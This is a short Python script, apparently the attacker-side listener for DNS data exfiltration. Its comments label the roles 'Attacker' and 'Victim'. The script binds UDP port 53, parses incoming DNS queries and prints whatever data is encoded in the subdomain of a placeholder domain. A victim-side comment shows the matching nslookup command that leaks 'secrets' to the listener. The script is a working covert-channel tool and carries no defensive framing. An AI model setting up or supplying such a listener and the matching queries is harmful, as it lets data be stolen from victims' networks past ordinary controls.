import socket
import re
import binascii
from dnslib import DNSRecord

# Attacker: sudo python3 ns-dnsserv.py
# Victim:   nslookup secrets.subs.domain.com

# IP and Port to listen on
UDP_IP = "0.0.0.0"
UDP_PORT = 53

# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))

print(f"Listening for DNS requests on {UDP_IP}:{UDP_PORT}...")

# Listen for incoming DNS requests
while True:
    # Receive data from the socket
    byteData, addr = sock.recvfrom(2048)  # buffer size is 2048 bytes
    try:
        # Parse the DNS message
        msg = DNSRecord.parse(byteData)

        # Extract the queried domain name
        domain_name = str(msg.q.qname)

        # Regex search for the specific domain pattern in the DNS message
        m = re.search(r'(\S+)\.<sub-domain>\.<domain>\.com', domain_name)
        
        # If a match is found, print the extracted data
        if m:
            print(f"Got data from {addr}: {m.group(1)}")
        
    except Exception as e:
        # Print any errors during message processing
        print(f"Error: {e}")
        continue
